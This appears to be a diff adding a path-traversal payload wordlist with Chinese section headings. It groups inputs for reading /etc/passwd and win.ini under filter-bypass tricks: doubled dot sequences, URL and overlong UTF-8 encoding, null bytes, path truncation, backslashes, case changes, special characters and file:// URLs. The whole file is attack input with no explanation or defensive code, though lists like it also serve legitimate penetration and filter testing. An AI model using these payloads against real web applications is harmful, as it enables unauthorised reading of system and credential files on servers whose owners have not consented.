@@ -1,0 +1,48 @@
+# 双写绕过
+....//....//etc/passwd
+....\/....\/etc/passwd
+..../..../etc/passwd
+....\\....\\etc/passwd
+
+# 编码绕过
+%2e%2e/%2e%2e/etc/passwd
+%2e%2e%2f%2e%2e%2f/etc/passwd
+..%2f..%2f..%2fetc/passwd
+%252e%252e/%252e%252e/etc/passwd
+..%252f..%252f..%252fetc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+
+# Null 字节绕过 (PHP < 5.3.4)
+../etc/passwd%00
+../etc/passwd%00.jpg
+../etc/passwd%00.png
+../etc/passwd%00.html
+../etc/passwd\x00
+../etc/passwd\0
+
+# 路径截断
+../etc/passwd.......................................................................................
+../etc/passwd./././././././././././././././././././././././././././././././././././././././././././
+../etc/passwd[...长字符串...]
+
+# 反斜杠绕过
+..\..\..\etc\passwd
+..\/..\/..\/etc/passwd
+..\/..\/..\etc/passwd
+
+# 大小写绕过 (Windows)
+..\..\..\..\windows\win.ini
+..\..\..\..\WINDOWS\WIN.INI
+..\..\..\..\Windows\Win.ini
+
+# 特殊字符
+..;/..;/etc/passwd
+..%00/..%00/etc/passwd
+..%0d/..%0d/etc/passwd
+..%5c..%5c..%5cetc/passwd
+
+# 协议绕过
+file:///etc/passwd
+file://localhost/etc/passwd
+file://127.0.0.1/etc/passwd
